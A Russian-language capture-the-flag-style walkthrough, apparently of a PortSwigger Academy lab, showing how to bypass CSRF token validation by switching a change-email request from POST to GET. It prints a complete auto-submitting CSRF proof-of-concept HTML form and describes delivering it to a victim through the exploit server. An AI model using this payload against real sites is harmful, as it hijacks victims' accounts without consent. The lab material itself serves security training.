залонинимся под `wiener:peter`

изменим пароль на `test@test.com`
Перейдем в `Proxy` -> `HTTP history` и найдем запрос, который отправили для изменения почты
```
POST /my-account/change-email HTTP/2
email=test%40test.com&csrf=ajXkAqr60NjlVUnXftMhvmL9UWc7sBT7
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/2.%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/pics%20for%20walkthrough/1.png)
Некоторые приложения правильно проверяют токен, когда запрос использует метод `POST`, но пропускают проверку, когда используется метод `GET`.

В этой ситуации злоумышленник может переключиться на метод `GET`, чтобы обойти проверку и провести CSRF-атаку

в найденном выше запросе на изменение почты нажмем `ПКМ` -> `Engagement tools` -> `Generate CSRF PoC`
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0add00330399843c8033a32f009000f5.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="ajXkAqr60NjlVUnXftMhvmL9UWc7sBT7" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
перейдем в `exploit server`
изменим почтовый ящик на `test2@test.com` что в коде будет выглядеть как
`input type="hidden" name="email" value="test2&#64;test&#46;com" `
и изменим метод на `GET`, чтобы обойти валидацию csrf токена на ряде определенных запросов

Тем самым, сгенерированный нами PoC превратится в 
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0add00330399843c8033a32f009000f5.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="ajXkAqr60NjlVUnXftMhvmL9UWc7sBT7" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
который мы и отправим жетве
Нажмем `Store` и далее `Deliver to victim` и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/2.%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/pics%20for%20walkthrough/2.png)
